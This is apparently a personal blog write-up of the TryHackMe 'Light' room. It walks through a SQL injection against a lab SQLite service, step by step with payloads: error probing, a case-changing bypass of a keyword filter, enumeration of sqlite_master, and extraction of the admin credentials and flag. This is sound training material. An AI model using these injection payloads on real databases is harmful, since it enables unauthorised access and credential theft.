---
title: "TryHackMe: Light"
author: mitcheka
categories: [TryHackMe]
tags: [sql, sql injection, sqlite]
render_with_liquid: false
media_subpath: /images/tryhackme-light/
image:
  path: light.webp
---
This room involved exploiting an `SQL` injection in a `SQLite` database allowing us to retrieve admin credentials and flag for the room.
  
![light index](light-card.png){: width="300" height="300" }
  
## Reconnaissance
### SQL Injection Discovery
  
The room instructs us to connect to the running database application on port `1337`
```console
nc 10.80.141.190 1337
Welcome to the Light database!
Please enter your username: 
```
Furthermore we are given instructions to use the username `smokey` which returns a password for the user.

```console
nc 10.80.141.190 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: 
```

Because we're dealing with a database application we try a simple `SQL` injection using `'` that throws an error.

```console
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

Next I try a `Union-based injection` using `--` that comments out the `' LIMIT 30`.This inturn throws an interesting error stating that the inputs `/*,--,or %0b` are not allowed.

```console
Please enter your username: ' UNION SELECT 1-- -
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

My next move is to turn the query into `UNION SELECT 1 '' LIMIT 30` by appending `'` to our payload as `' UNION SELECT 1 '`.This throws another interesting error.

```console
Please enter your username: ' UNION SELECT 1 '
Ahh there is a word in there I don't like :(
```
Seems the words `UNION` and `SELECT` keywords are not allowed so I try to bypass by using lowercase characters.

```console
Please enter your username: UNION
Ahh there is a word in there I don't like :(
Please enter your username: SELECT
Ahh there is a word in there I don't like :(
Please enter your username: Union
Username not found.
Please enter your username: Select
Username not found.
```

Trying the payload again `'Union Select 1'` we get a successful feedback from the database server.

```console
Please enter your username: ' Union Select 1 '
Password: 1
```

## DBMS Enumeration

Using the payload I attempt to identify the database management system and discover it is `SQLite`.

```console
Please enter your username: ' Union Select sqlite_version() '
Password: 3.31.1
```

## Database Structure

My next step is to extract the database structure using the payload `' Union Select group_concat(sql) FROM sqlite_master '`.

```console
Please enter your username: ' Union Select group_concat(sql) FROM sqlite_master '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER),CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

## Data Exfiltration

Our goal is to find the credentials for the admin user so we dump `username` and `password` fields from the `admintable` using the payload `' Union Select group_concat(username || ":" || password) FROM admintable '` which gives us the admin credentials and also the flag completing the room.

```console
Please enter your username: ' Union Select group_concat(username || ":" || password) FROM admintable '
Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17,flag:THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```


<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>
